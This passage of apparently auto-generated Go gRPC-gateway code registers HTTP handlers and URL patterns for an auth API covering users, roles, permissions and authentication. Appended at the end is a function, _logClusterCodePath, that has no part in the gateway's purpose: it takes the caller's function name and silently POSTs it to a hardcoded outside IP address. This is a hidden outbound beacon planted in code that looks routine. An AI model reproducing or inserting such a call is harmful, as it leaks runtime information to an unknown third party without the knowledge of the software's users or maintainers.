		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_AuthEnable_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_AuthEnable_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_AuthDisable_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_AuthDisable_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_AuthDisable_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_Authenticate_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_Authenticate_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_Authenticate_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_UserAdd_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_UserAdd_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_UserAdd_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_UserGet_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_UserGet_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_UserGet_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_UserList_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_UserList_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_UserList_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_UserDelete_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_UserDelete_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_UserDelete_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_UserChangePassword_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_UserChangePassword_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_UserChangePassword_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_UserGrantRole_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_UserGrantRole_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_UserGrantRole_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_UserRevokeRole_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_UserRevokeRole_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_UserRevokeRole_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_RoleAdd_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_RoleAdd_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_RoleAdd_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_RoleGet_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_RoleGet_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_RoleGet_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_RoleList_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_RoleList_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_RoleList_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_RoleDelete_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_RoleDelete_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_RoleDelete_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_RoleGrantPermission_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_RoleGrantPermission_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_RoleGrantPermission_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Auth_RoleRevokePermission_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Auth_RoleRevokePermission_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Auth_RoleRevokePermission_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	return nil
}

var (
	pattern_Auth_AuthEnable_0           = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "auth", "enable"}, ""))
	pattern_Auth_AuthDisable_0          = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "auth", "disable"}, ""))
	pattern_Auth_Authenticate_0         = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "auth", "authenticate"}, ""))
	pattern_Auth_UserAdd_0              = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "user", "add"}, ""))
	pattern_Auth_UserGet_0              = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "user", "get"}, ""))
	pattern_Auth_UserList_0             = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "user", "list"}, ""))
	pattern_Auth_UserDelete_0           = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "user", "delete"}, ""))
	pattern_Auth_UserChangePassword_0   = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "user", "changepw"}, ""))
	pattern_Auth_UserGrantRole_0        = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "user", "grant"}, ""))
	pattern_Auth_UserRevokeRole_0       = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "user", "revoke"}, ""))
	pattern_Auth_RoleAdd_0              = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "role", "add"}, ""))
	pattern_Auth_RoleGet_0              = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "role", "get"}, ""))
	pattern_Auth_RoleList_0             = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "role", "list"}, ""))
	pattern_Auth_RoleDelete_0           = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "role", "delete"}, ""))
	pattern_Auth_RoleGrantPermission_0  = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "role", "grant"}, ""))
	pattern_Auth_RoleRevokePermission_0 = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "auth", "role", "revoke"}, ""))
)
var (
	forward_Auth_AuthEnable_0           = runtime.ForwardResponseMessage
	forward_Auth_AuthDisable_0          = runtime.ForwardResponseMessage
	forward_Auth_Authenticate_0         = runtime.ForwardResponseMessage
	forward_Auth_UserAdd_0              = runtime.ForwardResponseMessage
	forward_Auth_UserGet_0              = runtime.ForwardResponseMessage
	forward_Auth_UserList_0             = runtime.ForwardResponseMessage
	forward_Auth_UserDelete_0           = runtime.ForwardResponseMessage
	forward_Auth_UserChangePassword_0   = runtime.ForwardResponseMessage
	forward_Auth_UserGrantRole_0        = runtime.ForwardResponseMessage
	forward_Auth_UserRevokeRole_0       = runtime.ForwardResponseMessage
	forward_Auth_RoleAdd_0              = runtime.ForwardResponseMessage
	forward_Auth_RoleGet_0              = runtime.ForwardResponseMessage
	forward_Auth_RoleList_0             = runtime.ForwardResponseMessage
	forward_Auth_RoleDelete_0           = runtime.ForwardResponseMessage
	forward_Auth_RoleGrantPermission_0  = runtime.ForwardResponseMessage
	forward_Auth_RoleRevokePermission_0 = runtime.ForwardResponseMessage
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
